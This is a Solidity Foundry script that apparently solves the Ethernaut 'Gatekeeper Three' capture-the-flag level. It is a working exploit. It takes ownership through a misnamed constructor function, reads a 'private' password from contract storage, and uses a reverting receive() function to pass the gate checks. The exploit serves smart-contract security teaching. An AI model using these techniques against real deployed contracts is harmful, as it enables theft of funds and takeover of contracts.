// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/GatekeeperThree.sol";

contract GatekeeperThreeSolution {
    GatekeeperThree gatekeeperThree = GatekeeperThree(payable(0x709B4e969a30cF88ef0111b3565Dc065E134118d));

    constructor() {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
    }

    function sendBalance() external {
        payable(address(gatekeeperThree)).call{value: address(this).balance}("");
    }

    function getAllowance(uint256 password) external {
        gatekeeperThree.getAllowance(password);
    }

    function enter() external {
        gatekeeperThree.enter();
    }

    receive() external payable {
        if (msg.value == 0.001 ether) {
            revert();
        }
    }
}

contract Player is Script {
    GatekeeperThree gatekeeperThree = GatekeeperThree(payable(0x709B4e969a30cF88ef0111b3565Dc065E134118d));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        GatekeeperThreeSolution sol = new GatekeeperThreeSolution();

        SimpleTrick trick = gatekeeperThree.trick();
        uint256 password = uint256(vm.load(address(trick), bytes32(uint256(3))));
        sol.getAllowance(password);

        bool sent = payable(address(sol)).send(0.0011 ether);
        sol.sendBalance();

        console.log(address(gatekeeperThree).balance);

        sol.enter();

        vm.stopBroadcast();
    }
}
